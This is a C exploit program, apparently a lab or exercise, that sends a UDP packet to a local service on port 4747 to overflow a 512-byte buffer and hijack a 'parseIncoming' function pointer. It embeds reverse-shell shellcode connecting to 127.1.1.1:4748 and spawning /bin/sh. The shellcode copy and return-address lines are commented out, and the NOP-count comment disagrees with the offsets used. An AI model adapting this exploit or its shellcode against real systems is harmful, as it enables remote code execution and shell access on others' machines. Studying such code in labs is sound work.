#include <stdlib.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>

//shellcode is from https://shell-storm.org/shellcode/files/shellcode-833.html
unsigned char sc[74] = "\x68"
"\x7f\x01\x01\x01"  // <- IP Number "127.1.1.1"
"\x5e\x66\x68"
"\x12\x8c"          // <- Port Number "4748"
"\x5f\x6a\x66\x58\x99\x6a\x01\x5b\x52\x53\x6a\x02"
"\x89\xe1\xcd\x80\x93\x59\xb0\x3f\xcd\x80\x49\x79"
"\xf9\xb0\x66\x56\x66\x57\x66\x6a\x02\x89\xe1\x6a"
"\x10\x51\x53\x89\xe1\xcd\x80\xb0\x0b\x52\x68\x2f"
"\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53"
"\xeb\xce";

int main(){
  //Set up socket and host address
  int s = socket(AF_INET, SOCK_DGRAM, 0);
  struct hostent *h = gethostbyname("127.0.0.1");
  struct sockaddr_in sa;
  sa.sin_family = AF_INET;
  sa.sin_port = htons(4747);
  sa.sin_addr = *((struct in_addr*)h->h_addr);
  
  //This is our malicious packet. Our victim writes our packet to a buffer and then
  //runs a function "parseIncoming" which we will attempt to overwrite. The buffer is 
  //512 characters long.  so we will start our payload with 438 nops.
  int psize = 600;
  unsigned char packet[psize];
  for (int i = 0; i < 600; ++i) packet[i] = '\x90';
  //Then we will add our shellcode
  //for (int j = 0; j < 74; ++j) packet[j] = sc[j];
  //Lastly, a new return address, which is the hardest part! Firstly, we need to overflow such that we overwrite
  //parseIncoming's address, which is 8 bytes, plus 1 for the header in the struct.
  /*packet[442+74] = '\xaa';
  packet[442+75] = '\xbb'; //here
  packet[442+76] = '\xcc';
  packet[442+77] = '\xdd';
  packet[442+78] = '\xee';
  packet[442+79] = '\xff';
  packet[442+80] = '\x7f';
  packet[442+81] = '\x00'; //to here
  packet[442+82] = '\x00';*/

  //Send malicious packet
  sendto(s, packet, psize, 0, (struct sockaddr*)&sa, sizeof(struct sockaddr));
  return 0;
}
